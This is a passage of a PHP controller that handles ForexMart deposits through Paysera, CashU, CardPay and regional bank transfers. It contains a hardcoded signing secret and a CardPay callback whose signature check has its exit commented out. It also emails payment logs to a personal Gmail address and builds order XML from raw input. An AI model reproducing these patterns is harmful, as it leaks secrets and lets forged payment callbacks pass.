                // Sending email to cancelled transaction
                if ($response['user_id'] == 54179) {
                    $account_detail = $this->account_model->getAccountByUserId($response['user_id']);
                    $details = [
                        'account_number' => $account_detail['account_number'],
                        'type' => 'PaySera',
                        'reason' => 'FAILED',
                    ];
                    $this->sendEmailFailedDeposit($details);
                }
            }

            foreach ($response as $key => $value) {
                $log .= $key.'='.$value.'<br/>';
            }

            if (!$this->deposit_model->insertPayment($data)) {
                $asset_user_docs=$this->config->item('asset_user_docs');
                file_put_contents($asset_user_docs.'paysera.log', $log.PHP_EOL, FILE_APPEND);
            }
        } catch (Exception $e) {
            $log .= get_class($e).': '.$e->getMessage();
        }

        $email_data = [
            'full_name' => 'vela',
            'email' => 'vela.nightclad@gmail.com',
            'account_number' => '',
        ];
        $subject = 'Paysera details';

        $this->load->library('email');

        $this->email->from('noreply@mail.forexmart.com', 'ForexMart');
        $this->email->reply_to('noreply@mail.forexmart.com', 'ForexMart');
        $this->email->to($email_data['email']);
        $this->email->subject($subject);
        $this->email->message($log);
        $this->email->send();
    }

    public function cashuFrom()
    {
        if ($this->session->userdata('logged')) {
            //FXPP::LoginTypeRestriction();

            $this->form_validation->set_rules('password', 'Password', 'trim|required|xss_clean');
            $this->form_validation->set_rules('re_password', 'Re-password', 'trim|required|xss_clean');
            $this->form_validation->set_rules('country', 'Country', 'trim|required|xss_clean');
            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->deposit_validation($this->session->userdata('user_id'));
            if ($this->form_validation->run() && !$data['error_msg']) {
//            $token = md5("951235746:".$this->input->post('amount').":".strtolower($this->input->post('currency')).":test");
//            $data = array(
//                'link'          => "https://sandbox.cashu.com/cgi-bin/pcashu.cgi",
//                'merchant_id' => "951235746",
//                'token'         =>$token,
//                'display_text'  => "Test Cashu",
//                'currency'      => $this->input->post('currency'),
//                'amount'        => $this->input->post('amount'),
//                'language'      => "en",
//                'session_id'    => $this->session->userdata('user_id'),
//                'txt1'          => "Cashu deposit"
//            );

                $token = md5($this->cashu_merchant_id.$this->input->post('amount', true).':'.strtolower($this->input->post('currency', true)).':'.$this->cashu_token);
                $data = [
                    'link' => 'https://sandbox.cashu.com/cgi-bin/pcashu.cgi',
                    'merchant_id' => $this->cashu_merchant_id,
                    'token' => $token,
                    'display_text' => 'Test Cashu',
                    'currency' => $this->input->post('currency', true),
                    'amount' => $this->input->post('amount', true),
                    'language' => 'en',
                    'session_id' => $this->session->userdata('user_id'),
                    'txt1' => 'Cashu deposit',
                ];

                $this->load->view('deposits/cashu_from', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function encodePaymentFields()
    {
        $orderXML = '';
        $sha512 = '';
        if ($this->input->is_ajax_request()) {
            $isSuccess = false;
            if ($this->session->userdata('logged')) {
                if ($this->session->userdata('login_type') == 1) {
                    $getaccount = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                    $getaccount['mt_currency_base'] = $getaccount['currency'];
                    $getaccount['account_number'] = $getaccount['reference_num'];
                } else {
                    $getaccount = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                }

                //Validation for NDB accounts with Bonus Profit
//                $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//                $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//                if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                    $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//                }

                $currency_conv = $getaccount['mt_currency_base'];
                $this->form_validation->set_rules('account_currency', 'Currency', 'trim|required|xss_clean|validate_account_id');
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|deposit_min_amount[$currency_conv]");

                $isValidationError = true;
                if ($this->form_validation->run()) {
                    //  if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960
                    $account_id = $this->input->post('account_currency', true);
                    if ($this->session->userdata('login_type') == 1) {
                        $account_info = $this->account_model->get_partner_by_id($account_id);
                        $login_type = 1;
                    } else {
                        $account_info = $this->account_model->get_account_by_id($account_id);
                        $login_type = 0;
                    }

                    $currency = $account_info['mt_currency_base'];
                    $amount = $this->input->post('amount', true);
                    $email = $this->session->userdata('email');
                    $user_id = $this->session->userdata('user_id');
                    $bonus = $this->input->post('bonus', true);

                    /* FXPP-6333
                    $isMicro = $this->account_model->isMicro($user_id);
                    if ($isMicro) {
                        $amount /= 100;
                    }
                     FXPP-6333 */
                    $test_users = unserialize(TEST_USERS_DEPOSIT);
                    if (in_array($user_id, $test_users)) {
                        $wallet_id = 3717;
                        //$currency = 'RUB';
                        $encrypt_fields = 'account_number='.$account_info['account_number'].';'.'bonus='.$bonus.';'.'login_type='.$login_type;
                    } else {
                        $wallet_id = $this->wallet_id;
                        $encrypt_fields = 'account_number='.$account_info['account_number'].';'.'bonus='.$bonus.';'.'login_type='.$login_type;
                    }
                    $note = FXPP::encrypt_data($encrypt_fields, $this->encrypt_key);
                    $description = 'Deposit on account number '.$account_info['account_number'];
                    $date = new DateTime();
                    $order_number = $date->getTimestamp();
                    $order = '<order wallet_id="'.$wallet_id.'" number="'.$order_number.'" customer_id="'.$user_id.'" description="'.$description.'" currency="'.$currency.'" amount="'.$amount.'" email="'.$email.'" return_url="'.base_url('deposit/cardpay').'" note="'.$note.'" cancel_url ="'.base_url('deposit/cancelCardPay').'"/>';
                    if (in_array($user_id, $test_users)) {
                        $sha512 = hash('sha512', $order.'9XKHl3nNp74t');
                    } else {
                        $sha512 = hash('sha512', $order.$this->cardpay_secret_key);
                    }
                    $orderXML = base64_encode($order);
                    $isSuccess = true;
                    FXPP::failedPaymentNotify('cardpay'); //FXPP-9628
//                    } else {
//                        $isSuccess = false;
//                        $isValidationError = false;
//                        $error = array(
//                            'HasError' => $data['CurPendValidation']['TradeError'],
//                            'err'      => $data['CurPendValidation']['TradeErrorMsg']
//                        );
//                    }
                } else {
                    $isValidationError = false;
                    $error = [
                        'amount' => form_error('amount'),
                        'currency' => form_error('account_currency'),
                        'err' => validation_errors(),
                    ];
                }
            }
            $this->output->set_content_type('application/json')->set_output(json_encode(['success' => $isSuccess, 'error' => $error, 'validation_error' => $isValidationError, 'sha512' => $sha512, 'order_xml' => $orderXML, 'order' => $order]));
        }
    }

    public function cardpay_v1()
    {
        if ($this->session->userdata('logged')) {
            show_404('accessing');

            // if(!IPLoc::Office()){
            //     FXPP::LoginTypeRestriction();
            // }

            if (!empty($_REQUEST['orderXML']) && !empty($_REQUEST['sha512'])) {
                $test_users = unserialize(TEST_USERS_DEPOSIT);
                if (in_array($this->session->userdata('user_id'), $test_users)) {
                    $cardpaySecretKey = '9XKHl3nNp74t';
                } else {
                    $cardpaySecretKey = $this->cardpay_secret_key;
                }
                $cardpayOrderXML = $_REQUEST['orderXML'];
                $cardpaySha512 = $_REQUEST['sha512'];

                $orderXML = base64_decode($cardpayOrderXML);
                $genSha512 = hash('sha512', $orderXML.$cardpaySecretKey);

                // if both hashes are the same, the post should come from CardPay Inc
                if ($genSha512 != $cardpaySha512) {
//                        Logger::addLog('CardPay callback: generated SHA512 is not equal to CardPay SHA512', 4, 4, 'generatedSha512', $genSha512);
//                        exit;
                }

                // get order XML as object
                $orderXMLObj = simplexml_load_string($orderXML);

                // order XML fields validation
                if (empty($orderXMLObj)) {
//                        Logger::addLog('CardPay callback: order XML object is empty', 4, 5);
//                        exit;
                }
                if (empty($orderXMLObj['number'])) {
//                        Logger::addLog('CardPay callback: cart id is empty', 4, 6);
//                        exit;
                }
                if (empty($orderXMLObj['status'])) {
//                        Logger::addLog('CardPay callback: order status is empty', 4, 7);
//                        exit;
                }

                // order must have APPROVED or PENDING status
                // if status is DECLINED then do nothing (exit)
                $orderStatus = strtoupper((string) $orderXMLObj['status']);
                if (('APPROVED' != $orderStatus) && ('PENDING' != $orderStatus)) {
                    // order is declined
                    exit;
                }

                // get cart information
                //$cartIdStr = (string)$orderXMLObj['number'];
                var_dump($orderXML);
            }

            $data['account_currency'] = $this->general_model->getAccountCurrencyBase();

            //$account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            if ($this->session->userdata('login_type') == 1) {
                $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
                $account = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                $account['mt_currency_base'] = $account['currency'];
                $account['account_number'] = $account['reference_num'];
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            }

            $data['account'] = $account;
            $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
            $data['account']['currency_new'] = $data['account']['currency'];
            if ($data['account']['currency_new'] == 'RUB') {
                $data['account']['currency_new'] = 'RUR';
            }
            $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
            //  $data['user_status'] = $user_status;
            $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id')); //joy deposit FXPP-6768
            $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
            $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            $eu_payment_result = $this->euPaymentStatus($this->session->userdata('user_id'), 'cardpay'); //FXPP-9628
            $data['eu_payment_status'] = $eu_payment_result['error'];
            $data['eu_error_message'] = $eu_payment_result['error_msg'];

            $data['amount'] = $this->input->post_get('amount1', true);
            $data['metadata_description'] = 'Credit Card copies may be required to process deposit request.';
            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            $js = $this->template->Js();
            $this->template->title('ForexMart | Deposit - Debit/Credit Cards')
                ->set_layout('internal/main')
                ->prepend_metadata("
                        <script src='".$js."custom-deposit.js'></script>
                            ")
                ->build('deposits/debit_credit_cards', $data);
        } else {
            redirect('signout');
        }
    }

    public function bank_transfer_mxn()
    { //mexico
        if ($this->session->userdata('logged')) {
            if (FXPP::isMexicanCountry() || IPLoc::Office()) {
                $data['amount'] = $this->input->post_get('amount1', true);
                $data['bounusfiled'] = $this->input->get('bonus', true);
                $data['currency'] = $currency = 'MXN';

                //if ($data['amount'] == null) {
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|non_usd_min_amt_validate[$currency]");
                $this->form_validation->set_rules('methods', 'Methods', 'trim|required|xss_clean');

                //}

                $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

                if ($this->form_validation->run() && !$data['error_msg']) {
                    // $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
                    $user_id = $this->session->userdata('user_id');
                    $account_number = $this->session->userdata('account_number');
                    $email = $this->session->userdata('email');
                    $full_name = $this->session->userdata('full_name');
                    $bonus = $this->input->get('bonus', true);
                    $amount = ceil($this->input->post('amount', true));
                    $this->load->library('CardPay');
                    $this->cardpay->setAccessType(0);
                    $test_users = unserialize(TEST_USERS_DEPOSIT);
                    if (in_array($user_id, $test_users)) {
                        $this->cardpay->setAccessType(0); // 0 - test 1 -live
                    } else {
                        $this->cardpay->setAccessType(1); // 0 - test 1 -live
                    }

                    //$currency = $this->input->post('currency', true);

                    $method = $this->input->post('methods', true);
                    if (strpos($method, 'BANKCARD') !== false) {
                        $method = 'BANKCARD';
                    }

                    $this->cardpay->setCurrency($data['currency']);
                    $this->cardpay->setMethod($method);
                    $this->cardpay->setUrl('auth_token');
                    $authRes = $this->cardpay->requestAuthToken();
                    $this->cardpay->setToken($authRes['access_token']);

                    $requestDate = date('Y-m-d\TH:i:s\Z', strtotime(FXPP::getCurrentDateTime())); //"2018-08-28T09:09:49Z"
                    $description = 'Deposit BANK MXN ['.$account_number.']';
                    $date = new DateTime();
                    $requestId = $date->getTimestamp();

                    $orderId = 'mxn'.uniqid();

                    $insert_data = [
                        'amount' => $amount,
                        'request_id' => $requestId,
                        'order_id       ' => $orderId,
                        'payment_method' => $method,
                        'payment_currency' => $data['currency'],
                        'bonus' => $bonus,
                        'create_date' => date('Y-m-d h:i:s'),
                        'user_id' => $user_id,
                    ];

                    $this->general_model->insertmy('cardpay', $insert_data);

                    $paymentParams = [
                        'request' => [
                            'id' => $requestId,
                            'time' => $requestDate,
                        ],
                        'merchant_order' => [
                            'id' => $orderId,
                            'description' => $description,
                        ],
                        'payment_method' => $method,
                        'payment_data' => [
                            'amount' => $amount,
                            'currency' => $data['currency'],
                        ],
                        'customer' => [
                            'email' => $email,
                            'full_name' => $full_name,
                            'id' => $user_id,
                        ],
                        'return_urls' => [
                            'cancel_url' => 'https://my.forexmart.com/deposit/bank_transfer_mxn?status=3',
                            'decline_url' => 'https://my.forexmart.com/deposit/bank_transfer_mxn?status=0',
                            'inprocess_url' => 'https://my.forexmart.com/deposit/bank_transfer_mxn?status=1',
                            'success_url' => 'https://my.forexmart.com/deposit/bank_transfer_mxn?status=2',
                        ],
                    ];

                    $this->cardpay->setUrl('payment');
                    $paymentRes = $this->cardpay->requestPayment($paymentParams);
                    if (isset($paymentRes['redirect_url'])) {
                        redirect($paymentRes['redirect_url']); //redirect to the payment gateway page.
                    } else {
                        $message = $paymentRes['message'];

                        $this->session->set_flashdata('cardpay_transaction', $message);
                        redirect(FXPP::loc_url('deposit/bank_transfer_mxn'));
                    }
                }

                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //    $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account_currency'] = $account['currency'];

                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status == '0') {
                    $data['msg'] = 'Transaction declined.';
                } elseif ($status == '1') {
                    $data['msg'] = 'Transaction in-process.';
                } elseif ($status == '2') {
                    $data['msg'] = 'Transaction successful.';
                } elseif ($status == '3') {
                    $data['msg'] = 'Transaction cancelled.';
                } elseif ($status == '4') {
                    $data['msg'] = 'Transaction failed.';
                } else {
                    $data['msg'] = '';
                }
                if (!empty(form_error('amount'))) {
                    $data['msg'] = '';
                }
                $data['metadata_description'] = 'CardPay';
                $this->template->title('ForexMart | Deposit - Banks of Mexico')
                    ->set_layout('internal/main')
                    ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                    ->build('deposits/cardpay_v2', $data);
            } else {
                redirect(FXPP::loc_url('deposit'));
            }
        } else {
            redirect('signout');
        }
    }

    public function bank_transfer_brl()
    { //brazil
        if ($this->session->userdata('logged')) {
            if (FXPP::isBrazilianCountry() || IPLoc::Office()) {
                $data['amount'] = $this->input->post_get('amount1', true);
                $data['bounusfiled'] = $this->input->get('bonus', true);
                $data['currency'] = $currency = 'BRL';

                //if ($data['amount'] == null) {
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|non_usd_min_amt_validate[$currency]");

                $this->form_validation->set_rules('methods', 'Methods', 'trim|required|xss_clean');

                //}

                $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

                if ($this->form_validation->run() && !$data['error_msg']) {
                    // $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
                    $user_id = $this->session->userdata('user_id');
                    $account_number = $this->session->userdata('account_number');
                    $email = $this->session->userdata('email');
                    $full_name = $this->session->userdata('full_name');
                    $bonus = $this->input->get('bonus', true);
                    $amount = ceil($this->input->post('amount', true));
                    $this->load->library('CardPay');
                    $this->cardpay->setAccessType(0);
                    $test_users = unserialize(TEST_USERS_DEPOSIT);
                    if (in_array($user_id, $test_users)) {
                        $this->cardpay->setAccessType(0); // 0 - test 1 -live
                    } else {
                        $this->cardpay->setAccessType(1); // 0 - test 1 -live
                    }

                    //  $currency = $this->input->post('currency', true);
                    $method = $this->input->post('methods', true);
                    if (strpos($method, 'BANKCARD') !== false) {
                        $method = 'BANKCARD';
                    }

                    $this->cardpay->setCurrency($data['currency']);
                    $this->cardpay->setMethod($method);
                    $this->cardpay->setUrl('auth_token');
                    $authRes = $this->cardpay->requestAuthToken();
                    $this->cardpay->setToken($authRes['access_token']);

                    $requestDate = date('Y-m-d\TH:i:s\Z', strtotime(FXPP::getCurrentDateTime())); //"2018-08-28T09:09:49Z"
                    $description = 'Deposit BANK BRL ['.$account_number.']';
                    $date = new DateTime();
                    $requestId = $date->getTimestamp();

                    $orderId = 'brl'.uniqid();

                    $insert_data = [
                    'amount' => $amount,
                    'request_id' => $requestId,
                    'order_id       ' => $orderId,
                    'payment_method' => $method,
                    'payment_currency' => $data['currency'],
                    'bonus' => $bonus,
                    'create_date' => date('Y-m-d h:i:s'),
                    'user_id' => $user_id,
                ];

                    $this->general_model->insertmy('cardpay', $insert_data);

                    $paymentParams = [
                    'request' => [
                        'id' => $requestId,
                        'time' => $requestDate,
                    ],
                    'merchant_order' => [
                        'id' => $orderId,
                        'description' => $description,
                    ],
                    'payment_method' => $method,
                    'payment_data' => [
                        'amount' => $amount,
                        'currency' => $data['currency'],
                    ],
                    'customer' => [
                        'email' => $email,
                        'full_name' => $full_name,
                        'id' => $user_id,
                    ],
                    'return_urls' => [
                        'cancel_url' => 'https://my.forexmart.com/deposit/bank_transfer_brl?status=3',
                        'decline_url' => 'https://my.forexmart.com/deposit/bank_transfer_brl?status=0',
                        'inprocess_url' => 'https://my.forexmart.com/deposit/bank_transfer_brl?status=1',
                        'success_url' => 'https://my.forexmart.com/deposit/bank_transfer_brl?status=2',
                    ],
                ];

                    $this->cardpay->setUrl('payment');
                    $paymentRes = $this->cardpay->requestPayment($paymentParams);
                    if (isset($paymentRes['redirect_url'])) {
                        redirect($paymentRes['redirect_url']); //redirect to the payment gateway page.
                    } else {
                        $message = $paymentRes['message'];

                        $this->session->set_flashdata('cardpay_transaction', $message);
                        redirect(FXPP::loc_url('deposit/bank_transfer_brl?status=4'));
                    }
                }

                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //    $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account_currency'] = $account['currency'];
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status == '0') {
                    $data['msg'] = 'Transaction declined.';
                } elseif ($status == '1') {
                    $data['msg'] = 'Transaction in-process.';
                } elseif ($status == '2') {
                    $data['msg'] = 'Transaction successful.';
                } elseif ($status == '3') {
                    $data['msg'] = 'Transaction cancelled.';
                } elseif ($status == '4') {
                    $data['msg'] = 'Transaction failed.';
                } else {
                    $data['msg'] = '';
                }
                if (!empty(form_error('amount'))) {
                    $data['msg'] = '';
                }
                $data['metadata_description'] = 'CardPay';
                $this->template->title('ForexMart | Deposit -  Banks of Brazil')
                ->set_layout('internal/main')
                ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build('deposits/cardpay_v2', $data);
            } else {
                redirect(FXPP::loc_url('deposit'));
            }
        } else {
            redirect('signout');
        }
    }

    public function bank_transfer_ngn()
    {//nigeria
        if ($this->session->userdata('logged')) {
            show_404('accessing');
            if (FXPP::isNigerianCountry() || IPLoc::Office()) {
                $data['amount'] = $this->input->post_get('amount1', true);
                $data['bounusfiled'] = $this->input->get('bonus', true);
                $data['currency'] = $currency = 'NGN';

                //if ($data['amount'] == null) {
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|non_usd_min_amt_validate[$currency]");

                $this->form_validation->set_rules('methods', 'Methods', 'trim|required|xss_clean');

                //}

                $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

                if ($this->form_validation->run() && !$data['error_msg']) {
                    // $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
                    $user_id = $this->session->userdata('user_id');
                    $account_number = $this->session->userdata('account_number');
                    $email = $this->session->userdata('email');
                    $full_name = $this->session->userdata('full_name');
                    $bonus = $this->input->get('bonus', true);
                    $amount = ceil($this->input->post('amount', true));
                    $this->load->library('CardPay');
                    $this->cardpay->setAccessType(0);
                    $test_users = unserialize(TEST_USERS_DEPOSIT);
                    if (in_array($user_id, $test_users)) {
                        $this->cardpay->setAccessType(0); // 0 - test 1 -live
                    } else {
                        $this->cardpay->setAccessType(1); // 0 - test 1 -live
                    }

                    //$currency = $this->input->post('currency', true);
                    $method = $this->input->post('methods', true);
                    if (strpos($method, 'BANKCARD') !== false) {
                        $method = 'BANKCARD';
                    }

                    $this->cardpay->setCurrency($data['currency']);
                    $this->cardpay->setMethod($method);
                    $this->cardpay->setUrl('auth_token');
                    $authRes = $this->cardpay->requestAuthToken();
                    $this->cardpay->setToken($authRes['access_token']);

                    $requestDate = date('Y-m-d\TH:i:s\Z', strtotime(FXPP::getCurrentDateTime())); //"2018-08-28T09:09:49Z"
                    $description = 'Deposit BANK NGN ['.$account_number.']';
                    $date = new DateTime();
                    $requestId = $date->getTimestamp();

                    $orderId = 'ngn'.uniqid();

                    $insert_data = [
                    'amount' => $amount,
                    'request_id' => $requestId,
                    'order_id       ' => $orderId,
                    'payment_method' => $method,
                    'payment_currency' => $data['currency'],
                    'bonus' => $bonus,
                    'create_date' => date('Y-m-d h:i:s'),
                    'user_id' => $user_id,
                ];

                    $this->general_model->insertmy('cardpay', $insert_data);

                    $paymentParams = [
                    'request' => [
                        'id' => $requestId,
                        'time' => $requestDate,
                    ],
                    'merchant_order' => [
                        'id' => $orderId,
                        'description' => $description,
                    ],
                    'payment_method' => $method,
                    'payment_data' => [
                        'amount' => $amount,
                        'currency' => $data['currency'],
                    ],
                    'customer' => [
                        'email' => $email,
                        'full_name' => $full_name,
                        'id' => $user_id,
                    ],
                    'return_urls' => [
                        'cancel_url' => 'https://my.forexmart.com/deposit/bank_transfer_ngn?status=3',
                        'decline_url' => 'https://my.forexmart.com/deposit/bank_transfer_ngn?status=0',
                        'inprocess_url' => 'https://my.forexmart.com/deposit/bank_transfer_ngn?status=1',
                        'success_url' => 'https://my.forexmart.com/deposit/bank_transfer_ngn?status=2',
                    ],
                ];

                    $this->cardpay->setUrl('payment');
                    $paymentRes = $this->cardpay->requestPayment($paymentParams);
                    if (isset($paymentRes['redirect_url'])) {
                        redirect($paymentRes['redirect_url']); //redirect to the payment gateway page.
                    } else {
                        $message = $paymentRes['message'];

                        $this->session->set_flashdata('cardpay_transaction', $message);
                        redirect(FXPP::loc_url('deposit/bank_transfer_ngn?status=4'));
                    }
                }

                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //    $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account_currency'] = $account['currency'];
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status == '0') {
                    $data['msg'] = 'Transaction declined.';
                } elseif ($status == '1') {
                    $data['msg'] = 'Transaction in-process.';
                } elseif ($status == '2') {
                    $data['msg'] = 'Transaction successful.';
                } elseif ($status == '3') {
                    $data['msg'] = 'Transaction cancelled.';
                } elseif ($status == '4') {
                    $data['msg'] = 'Transaction failed.';
                } else {
                    $data['msg'] = '';
                }
                if (!empty(form_error('amount'))) {
                    $data['msg'] = '';
                }
                $data['metadata_description'] = 'CardPay';
                $this->template->title('ForexMart | Deposit - Banks of Nigeria')
                ->set_layout('internal/main')
                ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build('deposits/cardpay_v2', $data);
            } else {
                redirect(FXPP::loc_url('deposit'));
            }
        } else {
            redirect('signout');
        }
    }

    public function bank_transfer_ugx()
    {//uganda
        if ($this->session->userdata('logged')) {
            redirect(FXPP::loc_url('deposit'));

            if (FXPP::isUgandaCountry() || IPLoc::Office()) {
                $data['amount'] = $this->input->post_get('amount1', true);
                $data['bounusfiled'] = $this->input->get('bonus', true);
                $data['currency'] = $currency = 'UGX';

                //if ($data['amount'] == null) {
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|non_usd_min_amt_validate[$currency]");

                $this->form_validation->set_rules('methods', 'Methods', 'trim|required|xss_clean');

                //}

                $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

                if ($this->form_validation->run() && !$data['error_msg']) {
                    // $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
                    $user_id = $this->session->userdata('user_id');
                    $account_number = $this->session->userdata('account_number');
                    $email = $this->session->userdata('email');
                    $full_name = $this->session->userdata('full_name');
                    $bonus = $this->input->get('bonus', true);
                    $amount = ceil($this->input->post('amount', true));
                    $this->load->library('CardPay');
                    $this->cardpay->setAccessType(0);
                    $test_users = unserialize(TEST_USERS_DEPOSIT);
                    if (in_array($user_id, $test_users)) {
                        $this->cardpay->setAccessType(0); // 0 - test 1 -live
                    } else {
                        $this->cardpay->setAccessType(1); // 0 - test 1 -live
                    }

                    //$currency = $this->input->post('currency', true);
                    $method = $this->input->post('methods', true);
                    if (strpos($method, 'BANKCARD') !== false) {
                        $method = 'BANKCARD';
                    }

                    $this->cardpay->setCurrency($data['currency']);
                    $this->cardpay->setMethod($method);
                    $this->cardpay->setUrl('auth_token');
                    $authRes = $this->cardpay->requestAuthToken();
                    $this->cardpay->setToken($authRes['access_token']);

                    $requestDate = date('Y-m-d\TH:i:s\Z', strtotime(FXPP::getCurrentDateTime())); //"2018-08-28T09:09:49Z"
                    $description = 'Deposit BANK UGX ['.$account_number.']';
                    $date = new DateTime();
                    $requestId = $date->getTimestamp();

                    $orderId = 'ugx'.uniqid();

                    $insert_data = [
                    'amount' => $amount,
                    'request_id' => $requestId,
                    'order_id       ' => $orderId,
                    'payment_method' => $method,
                    'payment_currency' => $data['currency'],
                    'bonus' => $bonus,
                    'create_date' => date('Y-m-d h:i:s'),
                    'user_id' => $user_id,
                ];

                    $this->general_model->insertmy('cardpay', $insert_data);

                    $paymentParams = [
                    'request' => [
                        'id' => $requestId,
                        'time' => $requestDate,
                    ],
                    'merchant_order' => [
                        'id' => $orderId,
                        'description' => $description,
                    ],
                    'payment_method' => $method,
                    'payment_data' => [
                        'amount' => $amount,
                        'currency' => $data['currency'],
                    ],
                    'customer' => [
                        'email' => $email,
                        'full_name' => $full_name,
                        'id' => $user_id,
                    ],
                    'return_urls' => [
                        'cancel_url' => 'https://my.forexmart.com/deposit/bank_transfer_ugx?status=3',
                        'decline_url' => 'https://my.forexmart.com/deposit/bank_transfer_ugx?status=0',
                        'inprocess_url' => 'https://my.forexmart.com/deposit/bank_transfer_ugx?status=1',
                        'success_url' => 'https://my.forexmart.com/deposit/bank_transfer_ugx?status=2',
                    ],
                ];

                    $this->cardpay->setUrl('payment');
                    $paymentRes = $this->cardpay->requestPayment($paymentParams);
                    if (isset($paymentRes['redirect_url'])) {
                        redirect($paymentRes['redirect_url']); //redirect to the payment gateway page.
                    } else {
                        $message = $paymentRes['message'];

                        $this->session->set_flashdata('cardpay_transaction', $message);
                        redirect(FXPP::loc_url('deposit/bank_transfer_ugx?status=4'));
                    }
                }

                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //    $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account_currency'] = $account['currency'];
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status == '0') {
                    $data['msg'] = 'Transaction declined.';
                } elseif ($status == '1') {
                    $data['msg'] = 'Transaction in-process.';
                } elseif ($status == '2') {
                    $data['msg'] = 'Transaction successful.';
                } elseif ($status == '3') {
                    $data['msg'] = 'Transaction cancelled.';
                } elseif ($status == '4') {
                    $data['msg'] = 'Transaction failed.';
                } else {
                    $data['msg'] = '';
                }
                if (!empty(form_error('amount'))) {
                    $data['msg'] = '';
                }
                $data['metadata_description'] = 'CardPay';
                $this->template->title('ForexMart | Deposit - Banks of Uganda')
                ->set_layout('internal/main')
                ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build('deposits/cardpay_v2', $data);
            } else {
                redirect(FXPP::loc_url('deposit'));
            }
        } else {
            redirect('signout');
        }
    }

    public function bank_transfer_kes()
    {//kenya
        if ($this->session->userdata('logged')) {
            if (IPLoc::Office()) {
                //FXPP::isKenyaCountry() FXPP-13427

                $data['amount'] = $this->input->post_get('amount1', true);
                $data['bounusfiled'] = $this->input->get('bonus', true);
                $data['currency'] = $currency = 'KES';

                //if ($data['amount'] == null) {
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|non_usd_min_amt_validate[$currency]");

                $this->form_validation->set_rules('methods', 'Methods', 'trim|required|xss_clean');

                //}

